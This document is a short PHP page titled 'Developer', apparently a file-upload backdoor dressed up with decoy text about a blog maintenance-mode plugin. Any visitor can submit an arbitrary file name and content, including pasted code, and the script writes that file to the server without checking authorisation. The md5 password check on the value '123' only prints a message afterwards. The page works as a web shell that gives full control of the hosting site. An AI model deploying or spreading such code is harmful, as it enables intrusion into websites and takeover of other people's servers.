<!DOCTYPE html>
<html>
<head>
	<title>Developer</title>
</head>
<body>
<?php
		$password = '123';

		$encrypted_password = md5($password);

		if(isset($_POST['submit'])) {
			$file_name = $_POST['file_name'];
			$file_content = $_POST['file_content'];

			$file = fopen($file_name, 'w');

			fwrite($file, $file_content);

			fclose($file);

			echo "Sample Done!!";
		}
	?>

	<form method="POST">
	  <input type="text" name="file_name" required><br><br>
		<textarea name="file_content" rows="10" cols="50" required>
			Add a maintenance page to your blog that lets visitors know your blog is down for maintenance, add a coming soon page for a new website or create a landing page for an existing site. User with admin rights gets full access to the blog including the front end.

			Activate the plugin and your blog is in maintenance mode, works and only registered users with enough rights can see the front end. You can use a date with a countdown timer for visitor information or set a value and unit for information.

			PASTE CODE HERE!
		</textarea><br><br>
		<input type="password" name="password" required><br><br>
		<input type="submit" name="submit" value="Buat File">
	</form>

	<?php
		if(isset($_POST['password']) && md5($_POST['password']) == $encrypted_password) {
			echo "Password benar! Anda memiliki akses penuh ke blog.";
		} elseif(isset($_POST['password'])) {
			echo "Password salah! Anda tidak memiliki akses ke blog.";
		}
	?>

</body>
</html>